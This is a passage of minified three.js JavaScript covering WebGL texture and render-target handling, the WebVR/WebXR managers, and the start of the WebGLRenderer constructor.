l;if(s?(e.texParameteri(i,10242,o.convert(a.wrapS)),e.texParameteri(i,10243,o.convert(a.wrapT)),32879!==i&&35866!==i||e.texParameteri(i,32882,o.convert(a.wrapR)),e.texParameteri(i,10240,o.convert(a.magFilter)),e.texParameteri(i,10241,o.convert(a.minFilter))):(e.texParameteri(i,10242,33071),e.texParameteri(i,10243,33071),32879!==i&&35866!==i||e.texParameteri(i,32882,33071),1001===a.wrapS&&1001===a.wrapT||console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping."),e.texParameteri(i,10240,_(a.magFilter)),e.texParameteri(i,10241,_(a.minFilter)),1003!==a.minFilter&&1006!==a.minFilter&&console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter.")),l=t.get("EXT_texture_filter_anisotropic")){if(1015===a.type&&null===t.get("OES_texture_float_linear"))return;if(1016===a.type&&null===(c||t.get("OES_texture_half_float_linear")))return;(a.anisotropy>1||n.get(a).__currentAnisotropy)&&(e.texParameterf(i,l.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(a.anisotropy,r.getMaxAnisotropy())),n.get(a).__currentAnisotropy=a.anisotropy)}}function L(t,i){void 0===t.__webglInit&&(t.__webglInit=!0,i.addEventListener("dispose",M),t.__webglTexture=e.createTexture(),a.memory.textures++)}function R(t,n,r){var a=3553;n.isDataTexture2DArray&&(a=35866),n.isDataTexture3D&&(a=32879),L(t,n),i.activeTexture(33984+r),i.bindTexture(a,t.__webglTexture),e.pixelStorei(37440,n.flipY),e.pixelStorei(37441,n.premultiplyAlpha),e.pixelStorei(3317,n.unpackAlignment);var s=function(e){return!c&&(1001!==e.wrapS||1001!==e.wrapT||1003!==e.minFilter&&1006!==e.minFilter)}(n)&&!1===y(n.image),l=g(n.image,s,!1,u),h=y(l)||c,d=o.convert(n.format),p=o.convert(n.type),f=x(d,p);P(a,n,h);var m,v=n.mipmaps;if(n.isDepthTexture){if(f=6402,1015===n.type){if(!1===c)throw new Error("Float Depth Texture only supported in WebGL2.0");f=36012}else c&&(f=33189);1026===n.format&&6402===f&&1012!==n.type&&1014!==n.type&&(console.warn("THREE.WebGLRenderer: Use UnsignedShortType or UnsignedIntType for DepthFormat DepthTexture."),n.type=1012,p=o.convert(n.type)),1027===n.format&&(f=34041,1020!==n.type&&(console.warn("THREE.WebGLRenderer: Use UnsignedInt248Type for DepthStencilFormat DepthTexture."),n.type=1020,p=o.convert(n.type))),i.texImage2D(3553,0,f,l.width,l.height,0,d,p,null)}else if(n.isDataTexture)if(v.length>0&&h){for(var _=0,M=v.length;_<M;_++)m=v[_],i.texImage2D(3553,_,f,m.width,m.height,0,d,p,m.data);n.generateMipmaps=!1,t.__maxMipLevel=v.length-1}else i.texImage2D(3553,0,f,l.width,l.height,0,d,p,l.data),t.__maxMipLevel=0;else if(n.isCompressedTexture){for(_=0,M=v.length;_<M;_++)m=v[_],1023!==n.format&&1022!==n.format?i.getCompressedTextureFormats().indexOf(d)>-1?i.compressedTexImage2D(3553,_,f,m.width,m.height,0,m.data):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):i.texImage2D(3553,_,f,m.width,m.height,0,d,p,m.data);t.__maxMipLevel=v.length-1}else if(n.isDataTexture2DArray)i.texImage3D(35866,0,f,l.width,l.height,l.depth,0,d,p,l.data),t.__maxMipLevel=0;else if(n.isDataTexture3D)i.texImage3D(32879,0,f,l.width,l.height,l.depth,0,d,p,l.data),t.__maxMipLevel=0;else if(v.length>0&&h){for(_=0,M=v.length;_<M;_++)m=v[_],i.texImage2D(3553,_,f,d,p,m);n.generateMipmaps=!1,t.__maxMipLevel=v.length-1}else i.texImage2D(3553,0,f,d,p,l),t.__maxMipLevel=0;b(n,h)&&w(3553,n,l.width,l.height),t.__version=n.version,n.onUpdate&&n.onUpdate(n)}function k(t,r,a,s){var c=o.convert(r.texture.format),l=o.convert(r.texture.type),h=x(c,l);i.texImage2D(s,0,h,r.width,r.height,0,c,l,null),e.bindFramebuffer(36160,t),e.framebufferTexture2D(36160,a,s,n.get(r.texture).__webglTexture,0),e.bindFramebuffer(36160,null)}function O(t,i,n){if(e.bindRenderbuffer(36161,t),i.depthBuffer&&!i.stencilBuffer){if(n){var r=B(i);e.renderbufferStorageMultisample(36161,r,33189,i.width,i.height)}else e.renderbufferStorage(36161,33189,i.width,i.height);e.framebufferRenderbuffer(36160,36096,36161,t)}else if(i.depthBuffer&&i.stencilBuffer){if(n){r=B(i);e.renderbufferStorageMultisample(36161,r,35056,i.width,i.height)}else e.renderbufferStorage(36161,34041,i.width,i.height);e.framebufferRenderbuffer(36160,33306,36161,t)}else{var a=x(o.convert(i.texture.format),o.convert(i.texture.type));if(n){r=B(i);e.renderbufferStorageMultisample(36161,r,a,i.width,i.height)}else e.renderbufferStorage(36161,a,i.width,i.height)}e.bindRenderbuffer(36161,null)}function I(t){var i=n.get(t),r=!0===t.isWebGLRenderTargetCube;if(t.depthTexture){if(r)throw new Error("target.depthTexture not supported in Cube render targets");!function(t,i){if(i&&i.isWebGLRenderTargetCube)throw new Error("Depth Texture with cube render targets is not supported");if(e.bindFramebuffer(36160,t),!i.depthTexture||!i.depthTexture.isDepthTexture)throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");n.get(i.depthTexture).__webglTexture&&i.depthTexture.image.width===i.width&&i.depthTexture.image.height===i.height||(i.depthTexture.image.width=i.width,i.depthTexture.image.height=i.height,i.depthTexture.needsUpdate=!0),E(i.depthTexture,0);var r=n.get(i.depthTexture).__webglTexture;if(1026===i.depthTexture.format)e.framebufferTexture2D(36160,36096,3553,r,0);else{if(1027!==i.depthTexture.format)throw new Error("Unknown depthTexture format");e.framebufferTexture2D(36160,33306,3553,r,0)}}(i.__webglFramebuffer,t)}else if(r){i.__webglDepthbuffer=[];for(var o=0;o<6;o++)e.bindFramebuffer(36160,i.__webglFramebuffer[o]),i.__webglDepthbuffer[o]=e.createRenderbuffer(),O(i.__webglDepthbuffer[o],t)}else e.bindFramebuffer(36160,i.__webglFramebuffer),i.__webglDepthbuffer=e.createRenderbuffer(),O(i.__webglDepthbuffer,t);e.bindFramebuffer(36160,null)}function B(e){return c&&e.isWebGLMultisampleRenderTarget?Math.min(d,e.samples):0}var D=!1,z=!1;this.allocateTextureUnit=function(){var e=T;return e>=l&&console.warn("THREE.WebGLTextures: Trying to use "+e+" texture units while this GPU supports only "+l),T+=1,e},this.resetTextureUnits=function(){T=0},this.setTexture2D=E,this.setTexture2DArray=function(e,t){var r=n.get(e);e.version>0&&r.__version!==e.version?R(r,e,t):(i.activeTexture(33984+t),i.bindTexture(35866,r.__webglTexture))},this.setTexture3D=function(e,t){var r=n.get(e);e.version>0&&r.__version!==e.version?R(r,e,t):(i.activeTexture(33984+t),i.bindTexture(32879,r.__webglTexture))},this.setTextureCube=A,this.setTextureCubeDynamic=C,this.setupRenderTarget=function(r){var s=n.get(r),l=n.get(r.texture);r.addEventListener("dispose",S),l.__webglTexture=e.createTexture(),a.memory.textures++;var h=!0===r.isWebGLRenderTargetCube,u=!0===r.isWebGLMultisampleRenderTarget,d=!0===r.isWebGLMultiviewRenderTarget,p=y(r)||c;if(h){s.__webglFramebuffer=[];for(var f=0;f<6;f++)s.__webglFramebuffer[f]=e.createFramebuffer()}else if(s.__webglFramebuffer=e.createFramebuffer(),u)if(c){s.__webglMultisampledFramebuffer=e.createFramebuffer(),s.__webglColorRenderbuffer=e.createRenderbuffer(),e.bindRenderbuffer(36161,s.__webglColorRenderbuffer);var m=x(o.convert(r.texture.format),o.convert(r.texture.type)),v=B(r);e.renderbufferStorageMultisample(36161,v,m,r.width,r.height),e.bindFramebuffer(36160,s.__webglMultisampledFramebuffer),e.framebufferRenderbuffer(36160,36064,36161,s.__webglColorRenderbuffer),e.bindRenderbuffer(36161,null),r.depthBuffer&&(s.__webglDepthRenderbuffer=e.createRenderbuffer(),O(s.__webglDepthRenderbuffer,r,!0)),e.bindFramebuffer(36160,null)}else console.warn("THREE.WebGLRenderer: WebGLMultisampleRenderTarget can only be used with WebGL2.");else if(d){var g=r.width,_=r.height,M=r.numViews;e.bindFramebuffer(36160,s.__webglFramebuffer);var T=t.get("OVR_multiview2");a.memory.textures+=2;var E=e.createTexture();e.bindTexture(35866,E),e.texParameteri(35866,10240,9728),e.texParameteri(35866,10241,9728),e.texImage3D(35866,0,32856,g,_,M,0,6408,5121,null),T.framebufferTextureMultiviewOVR(36160,36064,E,0,0,M);var A=e.createTexture();e.bindTexture(35866,A),e.texParameteri(35866,10240,9728),e.texParameteri(35866,10241,9728),e.texImage3D(35866,0,35056,g,_,M,0,34041,34042,null),T.framebufferTextureMultiviewOVR(36160,33306,A,0,0,M);var C=new Array(M);for(f=0;f<M;++f)C[f]=e.createFramebuffer(),e.bindFramebuffer(36160,C[f]),e.framebufferTextureLayer(36160,36064,E,0,f);s.__webglColorTexture=E,s.__webglDepthStencilTexture=A,s.__webglViewFramebuffers=C,e.bindFramebuffer(36160,null),e.bindTexture(35866,null)}if(h){i.bindTexture(34067,l.__webglTexture),P(34067,r.texture,p);for(f=0;f<6;f++)k(s.__webglFramebuffer[f],r,36064,34069+f);b(r.texture,p)&&w(34067,r.texture,r.width,r.height),i.bindTexture(34067,null)}else d||(i.bindTexture(3553,l.__webglTexture),P(3553,r.texture,p),k(s.__webglFramebuffer,r,36064,3553),b(r.texture,p)&&w(3553,r.texture,r.width,r.height),i.bindTexture(3553,null));r.depthBuffer&&I(r)},this.updateRenderTargetMipmap=function(e){var t=e.texture;if(b(t,y(e)||c)){var r=e.isWebGLRenderTargetCube?34067:3553,o=n.get(t).__webglTexture;i.bindTexture(r,o),w(r,t,e.width,e.height),i.bindTexture(r,null)}},this.updateMultisampleRenderTarget=function(t){if(t.isWebGLMultisampleRenderTarget)if(c){var i=n.get(t);e.bindFramebuffer(36008,i.__webglMultisampledFramebuffer),e.bindFramebuffer(36009,i.__webglFramebuffer);var r=t.width,o=t.height,a=16384;t.depthBuffer&&(a|=256),t.stencilBuffer&&(a|=1024),e.blitFramebuffer(0,0,r,o,0,0,r,o,a,9728)}else console.warn("THREE.WebGLRenderer: WebGLMultisampleRenderTarget can only be used with WebGL2.")},this.safeSetTexture2D=function(e,t){e&&e.isWebGLRenderTarget&&(!1===D&&(console.warn("THREE.WebGLTextures.safeSetTexture2D: don't use render targets as textures. Use their .texture property instead."),D=!0),e=e.texture),E(e,t)},this.safeSetTextureCube=function(e,t){e&&e.isWebGLRenderTargetCube&&(!1===z&&(console.warn("THREE.WebGLTextures.safeSetTextureCube: don't use cube render targets as textures. Use their .texture property instead."),z=!0),e=e.texture),e&&e.isCubeTexture||Array.isArray(e.image)&&6===e.image.length?A(e,t):C(e,t)}}function Kn(e,t,i){var n=i.isWebGL2;return{convert:function(e){var i;if(1e3===e)return 10497;if(1001===e)return 33071;if(1002===e)return 33648;if(1003===e)return 9728;if(1004===e)return 9984;if(1005===e)return 9986;if(1006===e)return 9729;if(1007===e)return 9985;if(1008===e)return 9987;if(1009===e)return 5121;if(1017===e)return 32819;if(1018===e)return 32820;if(1019===e)return 33635;if(1010===e)return 5120;if(1011===e)return 5122;if(1012===e)return 5123;if(1013===e)return 5124;if(1014===e)return 5125;if(1015===e)return 5126;if(1016===e){if(n)return 5131;if(null!==(i=t.get("OES_texture_half_float")))return i.HALF_FLOAT_OES}if(1021===e)return 6406;if(1022===e)return 6407;if(1023===e)return 6408;if(1024===e)return 6409;if(1025===e)return 6410;if(1026===e)return 6402;if(1027===e)return 34041;if(1028===e)return 6403;if(100===e)return 32774;if(101===e)return 32778;if(102===e)return 32779;if(200===e)return 0;if(201===e)return 1;if(202===e)return 768;if(203===e)return 769;if(204===e)return 770;if(205===e)return 771;if(206===e)return 772;if(207===e)return 773;if(208===e)return 774;if(209===e)return 775;if(210===e)return 776;if((33776===e||33777===e||33778===e||33779===e)&&null!==(i=t.get("WEBGL_compressed_texture_s3tc"))){if(33776===e)return i.COMPRESSED_RGB_S3TC_DXT1_EXT;if(33777===e)return i.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(33778===e)return i.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(33779===e)return i.COMPRESSED_RGBA_S3TC_DXT5_EXT}if((35840===e||35841===e||35842===e||35843===e)&&null!==(i=t.get("WEBGL_compressed_texture_pvrtc"))){if(35840===e)return i.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(35841===e)return i.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(35842===e)return i.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(35843===e)return i.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}if(36196===e&&null!==(i=t.get("WEBGL_compressed_texture_etc1")))return i.COMPRESSED_RGB_ETC1_WEBGL;if((37808===e||37809===e||37810===e||37811===e||37812===e||37813===e||37814===e||37815===e||37816===e||37817===e||37818===e||37819===e||37820===e||37821===e)&&null!==(i=t.get("WEBGL_compressed_texture_astc")))return e;if(103===e||104===e){if(n){if(103===e)return 32775;if(104===e)return 32776}if(null!==(i=t.get("EXT_blend_minmax"))){if(103===e)return i.MIN_EXT;if(104===e)return i.MAX_EXT}}if(1020===e){if(n)return 34042;if(null!==(i=t.get("WEBGL_depth_texture")))return i.UNSIGNED_INT_24_8_WEBGL}return 0}}}function er(e,t,i,n){E.call(this,e,t,n),this.depthBuffer=!1,this.stencilBuffer=!1,this.numViews=i}function tr(e,t){var i,n,r,o,a,s,c,l=e.extensions,h=e.properties,u=0;function d(e){return e.isArrayCamera?e.cameras:(a[0]=e,a)}this.isAvailable=function(){if(void 0===c){var e=l.get("OVR_multiview2");if(c=null!==e&&!1===t.getContextAttributes().antialias){u=t.getParameter(e.MAX_VIEWS_OVR),i=new er(0,0,2),s=new f,o=[],r=[],a=[];for(var n=0;n<u;n++)o[n]=new B,r[n]=new x}}return c},this.attachCamera=function(t){!1!==function(e){if(void 0===e.isArrayCamera)return!0;var t=e.cameras;if(t.length>u)return!1;for(var i=1,n=t.length;i<n;i++)if(t[0].viewport.z!==t[i].viewport.z||t[0].viewport.w!==t[i].viewport.w)return!1;return!0}(t)&&(n=e.getRenderTarget(),function(t){if(n?s.set(n.width,n.height):e.getDrawingBufferSize(s),t.isArrayCamera){var r=t.cameras[0].viewport;i.setSize(r.z,r.w),i.setNumViews(t.cameras.length)}else i.setSize(s.x,s.y),i.setNumViews(2)}(t),e.setRenderTarget(i))},this.detachCamera=function(r){i===e.getRenderTarget()&&(e.setRenderTarget(n),function(e){var n=i,r=n.numViews,o=h.get(n).__webglViewFramebuffers,a=n.width,c=n.height;if(e.isArrayCamera)for(var l=0;l<r;l++){var u=e.cameras[l].viewport,d=u.x,p=u.y,f=d+u.z,m=p+u.w;t.bindFramebuffer(36008,o[l]),t.blitFramebuffer(0,0,a,c,d,p,f,m,16384,9728)}else t.bindFramebuffer(36008,o[0]),t.blitFramebuffer(0,0,a,c,0,0,s.x,s.y,16384,9728)}(r))},this.updateCameraProjectionMatricesUniform=function(e,i){for(var n=d(e),r=0;r<n.length;r++)o[r].copy(n[r].projectionMatrix);i.setValue(t,"projectionMatrices",o)},this.updateCameraViewMatricesUniform=function(e,i){for(var n=d(e),r=0;r<n.length;r++)o[r].copy(n[r].matrixWorldInverse);i.setValue(t,"viewMatrices",o)},this.updateObjectMatricesUniforms=function(e,i,n){for(var a=d(i),s=0;s<a.length;s++)o[s].multiplyMatrices(a[s].matrixWorldInverse,e.matrixWorld),r[s].getNormalMatrix(o[s]);n.setValue(t,"modelViewMatrices",o),n.setValue(t,"normalMatrices",r)}}function ir(){K.call(this),this.type="Group"}function nr(e){Gt.call(this),this.cameras=e||[]}er.prototype=Object.assign(Object.create(E.prototype),{constructor:er,isWebGLMultiviewRenderTarget:!0,copy:function(e){return E.prototype.copy.call(this,e),this.numViews=e.numViews,this},setNumViews:function(e){return this.numViews!==e&&(this.numViews=e,this.dispose()),this}}),ir.prototype=Object.assign(Object.create(K.prototype),{constructor:ir,isGroup:!0}),nr.prototype=Object.assign(Object.create(Gt.prototype),{constructor:nr,isArrayCamera:!0});var rr,or=new y,ar=new y;function sr(e,t,i){or.setFromMatrixPosition(t.matrixWorld),ar.setFromMatrixPosition(i.matrixWorld);var n=or.distanceTo(ar),r=t.projectionMatrix.elements,o=i.projectionMatrix.elements,a=r[14]/(r[10]-1),s=r[14]/(r[10]+1),c=(r[9]+1)/r[5],l=(r[9]-1)/r[5],h=(r[8]-1)/r[0],u=(o[8]+1)/o[0],d=a*h,p=a*u,f=n/(-h+u),m=f*-h;t.matrixWorld.decompose(e.position,e.quaternion,e.scale),e.translateX(m),e.translateZ(f),e.matrixWorld.compose(e.position,e.quaternion,e.scale),e.matrixWorldInverse.getInverse(e.matrixWorld);var v=a+f,g=s+f,y=d-m,b=p+(n-m),w=c*s/g*v,x=l*s/g*v;e.projectionMatrix.makePerspective(y,b,w,x,v,g)}function cr(e){var t,i,n=this,r=null,o=null,a=null,s=[],c=new B,l=new B,h=1,u="local-floor";"undefined"!=typeof window&&"VRFrameData"in window&&(o=new window.VRFrameData,window.addEventListener("vrdisplaypresentchange",S,!1));var d=new B,p=new m,v=new y,g=new Gt;g.viewport=new T,g.layers.enable(1);var b=new Gt;b.viewport=new T,b.layers.enable(2);var w=new nr([g,b]);function x(){return null!==r&&!0===r.isPresenting}w.layers.enable(1),w.layers.enable(2);var _,M=new f;function S(){if(x()){var o=r.getEyeParameters("left");t=2*o.renderWidth*h,i=o.renderHeight*h,_=e.getPixelRatio(),e.getSize(M),e.setDrawingBufferSize(t,i,1),g.viewport.set(0,0,t/2,i),b.viewport.set(t/2,0,t/2,i),P.start(),n.dispatchEvent({type:"sessionstart"})}else n.enabled&&e.setDrawingBufferSize(M.width,M.height,_),P.stop(),n.dispatchEvent({type:"sessionend"})}var E=[];function A(e){for(var t=navigator.getGamepads&&navigator.getGamepads(),i=0,n=t.length;i<n;i++){var r=t[i];if(r&&("Daydream Controller"===r.id||"Gear VR Controller"===r.id||"Oculus Go Controller"===r.id||"OpenVR Gamepad"===r.id||r.id.startsWith("Oculus Touch")||r.id.startsWith("HTC Vive Focus")||r.id.startsWith("Spatial Controller"))){var o=r.hand;if(0===e&&(""===o||"right"===o))return r;if(1===e&&"left"===o)return r}}}function C(e,n){null!==n&&4===n.length&&e.set(n[0]*t,n[1]*i,n[2]*t,n[3]*i)}this.enabled=!1,this.getController=function(e){var t=s[e];return void 0===t&&((t=new ir).matrixAutoUpdate=!1,t.visible=!1,s[e]=t),t},this.getDevice=function(){return r},this.setDevice=function(e){void 0!==e&&(r=e),P.setContext(e)},this.setFramebufferScaleFactor=function(e){h=e},this.setReferenceSpaceType=function(e){u=e},this.setPoseTarget=function(e){void 0!==e&&(a=e)},this.getCamera=function(e){var t="local-floor"===u?1.6:0;if(!1===x())return e.position.set(0,t,0),e.rotation.set(0,0,0),e;if(r.depthNear=e.near,r.depthFar=e.far,r.getFrameData(o),"local-floor"===u){var i=r.stageParameters;i?c.fromArray(i.sittingToStandingTransform):c.makeTranslation(0,t,0)}var n=o.pose,h=null!==a?a:e;h.matrix.copy(c),h.matrix.decompose(h.position,h.quaternion,h.scale),null!==n.orientation&&(p.fromArray(n.orientation),h.quaternion.multiply(p)),null!==n.position&&(p.setFromRotationMatrix(c),v.fromArray(n.position),v.applyQuaternion(p),h.position.add(v)),h.updateMatrixWorld(),g.near=e.near,b.near=e.near,g.far=e.far,b.far=e.far,g.matrixWorldInverse.fromArray(o.leftViewMatrix),b.matrixWorldInverse.fromArray(o.rightViewMatrix),l.getInverse(c),"local-floor"===u&&(g.matrixWorldInverse.multiply(l),b.matrixWorldInverse.multiply(l));var f=h.parent;null!==f&&(d.getInverse(f.matrixWorld),g.matrixWorldInverse.multiply(d),b.matrixWorldInverse.multiply(d)),g.matrixWorld.getInverse(g.matrixWorldInverse),b.matrixWorld.getInverse(b.matrixWorldInverse),g.projectionMatrix.fromArray(o.leftProjectionMatrix),b.projectionMatrix.fromArray(o.rightProjectionMatrix),sr(w,g,b);var m=r.getLayers();if(m.length){var y=m[0];C(g.viewport,y.leftBounds),C(b.viewport,y.rightBounds)}return function(){for(var e=0;e<s.length;e++){var t=s[e],i=A(e);if(void 0!==i&&void 0!==i.pose){if(null===i.pose)return;var n=i.pose;!1===n.hasPosition&&t.position.set(.2,-.6,-.05),null!==n.position&&t.position.fromArray(n.position),null!==n.orientation&&t.quaternion.fromArray(n.orientation),t.matrix.compose(t.position,t.quaternion,t.scale),t.matrix.premultiply(c),t.matrix.decompose(t.position,t.quaternion,t.scale),t.matrixWorldNeedsUpdate=!0,t.visible=!0;var r="Daydream Controller"===i.id?0:1;void 0===E[e]&&(E[e]=!1),E[e]!==i.buttons[r].pressed&&(E[e]=i.buttons[r].pressed,!0===E[e]?t.dispatchEvent({type:"selectstart"}):(t.dispatchEvent({type:"selectend"}),t.dispatchEvent({type:"select"})))}else t.visible=!1}}(),w},this.getStandingMatrix=function(){return c},this.isPresenting=x;var P=new ri;this.setAnimationLoop=function(e){P.setAnimationLoop(e),x()&&P.start()},this.submitFrame=function(){x()&&r.submitFrame()},this.dispose=function(){"undefined"!=typeof window&&window.removeEventListener("vrdisplaypresentchange",S)},this.setFrameOfReferenceType=function(){console.warn("THREE.WebVRManager: setFrameOfReferenceType() has been deprecated.")}}function lr(e,t){var i=this,n=null,r=null,o="local-floor",a=null,s=[],c=[];function l(){return null!==n&&null!==r}var h=new Gt;h.layers.enable(1),h.viewport=new T;var u=new Gt;u.layers.enable(2),u.viewport=new T;var d=new nr([h,u]);function p(e){for(var t=0;t<s.length;t++)c[t]===e.inputSource&&s[t].dispatchEvent({type:e.type})}function f(){e.setFramebuffer(null),e.setRenderTarget(e.getRenderTarget()),w.stop(),i.dispatchEvent({type:"sessionend"})}function m(e){r=e,w.setContext(n),w.start(),i.dispatchEvent({type:"sessionstart"})}function v(){for(var e=0;e<s.length;e++)c[e]=g(e)}function g(e){for(var t=n.inputSources,i=0;i<t.length;i++){var r=t[i],o=r.handedness;if(0===e&&("none"===o||"right"===o))return r;if(1===e&&"left"===o)return r}}function y(e,t){null===t?e.matrixWorld.copy(e.matrix):e.matrixWorld.multiplyMatrices(t.matrixWorld,e.matrix),e.matrixWorldInverse.getInverse(e.matrixWorld)}d.layers.enable(1),d.layers.enable(2),this.enabled=!1,this.getController=function(e){var t=s[e];return void 0===t&&((t=new ir).matrixAutoUpdate=!1,t.visible=!1,s[e]=t),t},this.setFramebufferScaleFactor=function(){},this.setReferenceSpaceType=function(e){o=e},this.getSession=function(){return n},this.setSession=function(e){null!==(n=e)&&(n.addEventListener("select",p),n.addEventListener("selectstart",p),n.addEventListener("selectend",p),n.addEventListener("end",f),n.updateRenderState({baseLayer:new XRWebGLLayer(n,t)}),n.requestReferenceSpace(o).then(m),n.addEventListener("inputsourceschange",v),v())},this.getCamera=function(e){if(l()){var t=e.parent,i=d.cameras;y(d,t);for(var n=0;n<i.length;n++)y(i[n],t);e.matrixWorld.copy(d.matrixWorld);for(var r=e.children,o=(n=0,r.length);n<o;n++)r[n].updateMatrixWorld(!0);return sr(d,h,u),d}return e},this.isPresenting=l;var b=null;var w=new ri;w.setAnimationLoop((function(t,i){if(null!==(a=i.getViewerPose(r))){var o=a.views,l=n.renderState.baseLayer;e.setFramebuffer(l.framebuffer);for(var h=0;h<o.length;h++){var u=o[h],p=l.getViewport(u),f=u.transform.inverse.matrix,m=d.cameras[h];m.matrix.fromArray(f).getInverse(m.matrix),m.projectionMatrix.fromArray(u.projectionMatrix),m.viewport.set(p.x,p.y,p.width,p.height),0===h&&d.matrix.copy(m.matrix)}}for(h=0;h<s.length;h++){var v=s[h],g=c[h];if(g){var y=i.getPose(g.targetRaySpace,r);if(null!==y){v.matrix.fromArray(y.transform.matrix),v.matrix.decompose(v.position,v.rotation,v.scale),v.visible=!0;continue}}v.visible=!1}b&&b(t)})),this.setAnimationLoop=function(e){b=e},this.dispose=function(){},this.getStandingMatrix=function(){return console.warn("THREE.WebXRManager: getStandingMatrix() is no longer needed."),new B},this.getDevice=function(){console.warn("THREE.WebXRManager: getDevice() has been deprecated.")},this.setDevice=function(){console.warn("THREE.WebXRManager: setDevice() has been deprecated.")},this.setFrameOfReferenceType=function(){console.warn("THREE.WebXRManager: setFrameOfReferenceType() has been deprecated.")},this.submitFrame=function(){}}function hr(e){var t=void 0!==(e=e||{}).canvas?e.canvas:document.createElementNS("http://www.w3.org/1999/xhtml","canvas"),i=void 0!==e.context?e.context:null,n=void 0!==e.alpha&&e.alpha,r=void 0===e.depth||e.depth,o=void 0===e.stencil||e.stencil,a=void 0!==e.antialias&&e.antialias,s=void 0===e.premultipliedAlpha||e.premultipliedAlpha,c=void 0!==e.preserveDrawingBuffer&&e.preserveDrawingBuffer,l=void 0!==e.powerPreference?e.powerPreference:"default",h=void 0!==e.failIfMajorPerformanceCaveat&&e.failIfMajorPerformanceCaveat,u=null,d=null;this.domElement=t,this.debug={checkShaderErrors:!0},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.gammaFactor=2,this.gammaInput=!1,this.gammaOutput=!1,this.physicallyCorrectLights=!1,this.toneMapping=1,this.toneMappingExposure=1,this.toneMappingWhitePoint=1,this.maxMorphTargets=8,this.maxMorphNormals=4;var m,v,g,b,w,x,_,M,S,E,A,C,P,L,R,k,O,I,D,z=this,F=!1,N=null,j=0,U=0,V=null,H=null,G=-1,W=null,q=null,X=new T,Y=new T,Z=null,Q=t.width,$=t.height,J=1,K=new T(0,0,Q,$),ee=new T(0,0,Q,$),te=!1,ie=new ei,ne=new di,re=!1,oe=!1,ae=new B,se=new y;function ce(){return null===V?J:1}try{var le={alpha:n,depth:r,stencil:o,antialias:a,premultipliedAlpha:s,preserveDrawingBuffer:c,powerPreference:l,failIfMajorPerformanceCaveat:h,xrCompatible:!0};if(t.addEventListener("webglcontextlost",fe,!1),t.addEventListener("webglcontextrestored",me,!1),null===(m=i||t.getContext("webgl",le)||t.getContext("experimental-webgl",le)))throw null!==t.getContext("webgl")?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.");void 0===m.getShaderPrecisionFormat&&(m.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}})}catch(e){throw console.error("THREE.WebGLRenderer: "+e.message),e}function he(){v=new pi(m),!1===(g=new ui(m,v,e)).isWebGL2&&(v.get("WEBGL_depth_texture"),v.get("OES_texture_float"),v.get("OES_texture_half_float"),v.get("OES_texture_half_float_linear"),v.get("OES_standard_derivatives"),v.get("OES_element_index_uint"),v.get("OES_vertex_array_object"),v.get("ANGLE_instanced_arrays")),v.get("OES_texture_float_linear"),I=new Kn(m,v,g),(b=new $n(m,v,I,g)).scissor(Y.copy(ee).multiplyScalar(J).floor()),b.viewport(X.copy(K).multiplyScalar(J).floor()),w=new vi(m),x=new zn,_=new Jn(m,v,b,x,g,I,w),M=new oi(m),D=new li(m,v,M,g),S=new fi(m,M,w,D),E=new wi(m,S,M,w),R=new bi(m),A=new Dn(z,v,g,D),C=new Un,P=new Xn,L=new ci(z,b,E,s),k=new hi(m,v,w,g),O=new mi(m,v,w,g),w.programs=A.programs,z.capabilities=g,z.extensions=v,z.properties=x,z.renderLists=C,z.textures=_,z.state=b,z.info=w}he();var ue="undefined"!=typeof navigator&&"xr"in navigator&&"isSessionSupported"in navigator.xr?new lr(z,m):new cr(z);this.vr=ue;var de=new tr(z,m),pe=new Qn(z,E,g.maxTextureSize);function fe(e){e.preventDefault(),console.log("THREE.WebGLRenderer: Context Lost."),F=!0}function me(){console.log("THREE.WebGLRenderer: Context Restored."),F=!1,he()}function ve(e){var t=e.target;t.removeEventListener("dispose",ve),function(e){ge(e),x.remove(e)}(t)}function ge(e){var t=x.get(e).program;e.program=void 0,void 0!==t&&A.releaseProgram(t)}this.shadowMap=pe,this.getContext=function(){return m},this.getContextAttributes=function(){return m.getContextAttributes()},this.forceContextLoss=function(){var e=v.get("WEBGL_lose_context");e&&e.loseContext()},this.forceContextRestore=function(){var e=v.get("WEBGL_lose_context");e&&e.restoreContext()},this.getPixelRatio=function(){return J},this.setPixelRatio=function(e){void 0!==e&&(J=e,this.setSize(Q,$,!1))},this.getSize=function(e){return void 0===e&&(console.warn("WebGLRenderer: .getsize() now requires a Vector2 as an argument"),e=new f),e.set(Q,$)},this.setSize=function(e,i,n){ue.isPresenting()?console.warn("THREE.WebGLRenderer: Can't change size while VR device is presenting."):(Q=e,$=i,t.width=Math.floor(e*J),t.height=Math.floor(i*J),!1!==n&&(t.style.width=e+"px",t.style.height=i+"px"),this.setViewport(0,0,e,i))},this.getDrawingBufferSize=function(e){return void 0===e&&(console.warn("WebGLRenderer: .getdrawingBufferSize() now requires a Vector2 as an argument"),e=new f),e.set(Q*J,$*J).floor()},this.setDrawingBufferSize=function(e,i,n){Q=e,$=i,J=n,t.width=Math.floor(e*n),t.height=Math.floor(i*n),this.setViewport(0,0,e,i)},this.getCurrentViewport=function(e){return void 0===e&&(console.warn("WebGLRenderer: .getCurrentViewport() now requires a Vector4 as an argument"),e=new T),e.copy(X)},this.getViewport=function(e){return e.copy(K)},this.setViewport=function(e,t,i,n){e.isVector4?K.set(e.x,e.y,e.z,e.w):K.set(e,t,i,n),b.viewport(X.copy(K).multiplyScalar(J).floor())},this.getScissor=function(e){return 